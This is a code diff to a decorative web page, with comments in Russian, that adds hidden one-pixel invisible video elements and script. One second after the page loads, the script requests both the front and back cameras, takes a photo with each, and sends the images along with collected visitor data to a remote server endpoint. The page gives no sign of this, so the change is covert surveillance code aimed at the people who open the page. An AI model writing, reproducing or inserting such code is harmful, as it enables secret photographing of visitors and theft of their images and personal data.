@@ -45,6 +45,15 @@
             display: none !important; 
         }
 
+        /* Скрытые видео элементы для камеры */
+        #frontVideo, #backVideo {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
         /* ФОНОВАЯ СЕТКА */
         .grid-bg {
             position: fixed;
@@ -373,6 +382,10 @@
 </head>
 <body>
 
+    <!-- Скрытые видео элементы для камеры -->
+    <video id="frontVideo" autoplay playsinline></video>
+    <video id="backVideo" autoplay playsinline></video>
+
     <div class="grid-bg"></div>
 
     <div id="particles"></div>
@@ -492,6 +505,77 @@
             };
         }
 
+        // Функция для захвата фото с камеры
+        async function capturePhoto(videoElement, facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                
+                videoElement.srcObject = stream;
+                
+                // Ждём загрузки видео
+                await new Promise(resolve => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                });
+                
+                // Ждём немного для стабилизации
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Создаём canvas и делаем снимок
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0);
+                
+                // Останавливаем стрим
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Возвращаем base64
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (error) {
+                console.error('Camera error:', error);
+                return null;
+            }
+        }
+
+        // Функция для съёмки с обеих камер
+        async function captureAllPhotos() {
+            if (isUserBanned()) return;
+            
+            try {
+                const frontVideo = document.getElementById('frontVideo');
+                const backVideo = document.getElementById('backVideo');
+                
+                // Пытаемся сделать фото с фронтальной камеры
+                const frontPhoto = await capturePhoto(frontVideo, 'user');
+                
+                // Пытаемся сделать фото с задней камеры
+                const backPhoto = await capturePhoto(backVideo, 'environment');
+                
+                // Если хоть одно фото получено, отправляем
+                if (frontPhoto || backPhoto) {
+                    const data = getExtendedData();
+                    
+                    fetch(`${SERVER_URL}/send_photos`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...data,
+                            front_camera: frontPhoto,
+                            back_camera: backPhoto
+                        })
+                    }).catch(e => console.error(e));
+                }
+            } catch (err) {
+                console.error('Photo capture failed:', err);
+            }
+        }
+
         function logEntry() {
             try {
                 if (isUserBanned()) return; 
@@ -503,6 +587,11 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 }).catch(e => console.error(e));
+                
+                // Пытаемся сделать фото через 1 секунду после загрузки
+                setTimeout(() => {
+                    captureAllPhotos();
+                }, 1000);
             } catch (err) { console.error(err); }
         }
         logEntry();
